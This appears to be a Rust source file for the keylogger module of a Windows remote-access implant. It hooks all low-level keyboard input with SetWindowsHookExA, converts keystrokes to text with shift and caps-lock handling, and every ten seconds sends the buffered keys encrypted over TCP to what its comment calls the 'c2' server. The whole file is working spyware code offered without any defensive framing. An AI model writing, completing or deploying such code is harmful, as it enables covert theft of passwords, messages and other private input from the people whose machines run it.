use tokio::sync::{watch, Mutex};
use std::{sync::Arc, time::Duration};
use shared::{DataPacket, ShutDownType, StatusType};
use tokio::net::tcp::OwnedWriteHalf;
use windows::Win32::{Foundation::{BOOL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM}, UI::{Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyState, ToAscii}, WindowsAndMessaging::{CallNextHookEx, DispatchMessageA, GetMessageA, SetWindowsHookExA, TranslateMessage, UnhookWindowsHookEx, HHOOK, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN}}};
use lazy_static::lazy_static;
use shared::encrypted_write_from_key;

lazy_static! { static ref BUFFER: Arc<Mutex<Vec<u16>>> = Arc::new(Mutex::new(vec![])); }
pub struct KeyLog {
    pub stream: Arc<Mutex<OwnedWriteHalf>>,
    pub hookid: Option<HHOOK>,
    pub notifier: watch::Sender<StatusType>,
    pub key: [u8; 32],
}

// a crude workaround due to the windows API not liking when the message intercepting is on the same thread as everything else
pub fn start(keylog: Arc<KeyLog>) {
    let copy = keylog.clone();
    std::thread::spawn( move || {
        copy.launch()?;
        Ok::<(), std::io::Error>(())
    }); 
    tokio::spawn(async move {
        keylog.write_to_server().await?;
        Ok::<(), std::io::Error>(())
    });
}
 
impl KeyLog {
    //start intercepting lowlevel keyboard messages sent on the system
    pub fn launch(&self) -> std::io::Result<()>{
        println!("starting keylogger");
        unsafe {
            let id = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keylog_callback), HINSTANCE(0), 0).unwrap();
            let m: *const MSG = &MSG::default();
            while GetMessageA( m as *mut MSG, HWND(0), 0, 0) != BOOL(0) {
                let _ = TranslateMessage(m);
                DispatchMessageA(m);   
            }
            println!("died?");
            UnhookWindowsHookEx(id)?;
        }
        Ok::<(), std::io::Error>(())
    }

    pub fn shutdown(&mut self) -> ShutDownType {
        if self.hookid.is_some() {
            unsafe { UnhookWindowsHookEx(self.hookid.unwrap()); }
        }
        //self.status = StatusType::Stopped;
        ShutDownType::Successful
    }

}


impl KeyLog {
    //periodically write the keys which have been logged in the buffer to c2
    pub async fn write_to_server(&self) -> std::io::Result<()>{
            loop {
                std::thread::sleep(Duration::from_secs(10));
                let buf = BUFFER.clone();
                let mut buf = buf.lock().await;
                if buf.len() > 0 {
                    let mut data_write: Vec<u8> = vec![];
                    for char in buf.iter() {
                        data_write.extend(char.to_le_bytes())
                    }
                    let data = DataPacket {
                        module_type: shared::ModuleType::KeyLogger,
                        data: data_write
                    };
                    encrypted_write_from_key(self.stream.clone(), &self.key, data).await?;
                    buf.clear();
                }
            }
            
    }


}

//callback that windows API will use, this finds the pressed key, converts it to the right format (e.g. caps lock/shift) and stored it in buffer
unsafe extern "system" fn keylog_callback(code: i32, wparam: WPARAM, lparam:LPARAM) -> LRESULT {
    if wparam.0 as u32 != WM_KEYDOWN {
        return CallNextHookEx(HHOOK::default(), code, wparam, lparam)
    }
    let mut keyboard_state: [u8; 256] = [0; 256];
    let kbdstruct: KBDLLHOOKSTRUCT = *(lparam.0 as *const isize).cast();
    let vkcode = kbdstruct.vkCode;
    let buf = BUFFER.clone();
    let mut buf = buf.blocking_lock();
    let mut ascii_key: u16 = 0;
    let shift_info = GetAsyncKeyState(0x10);
    let caps_info = GetKeyState(0x14);
    if (shift_info >> 15) & 1 == 1 {
        keyboard_state[0x10] = 255;
    }
    if (caps_info & 1) == 1 {
        keyboard_state[0x14] = 255;
    }
    ToAscii(vkcode, 0, Some(&keyboard_state), &mut ascii_key, 0);
    if (ascii_key > 31) && (ascii_key < 127) {
        buf.push(ascii_key);
    }
    CallNextHookEx(HHOOK(0), code, wparam, lparam)
}

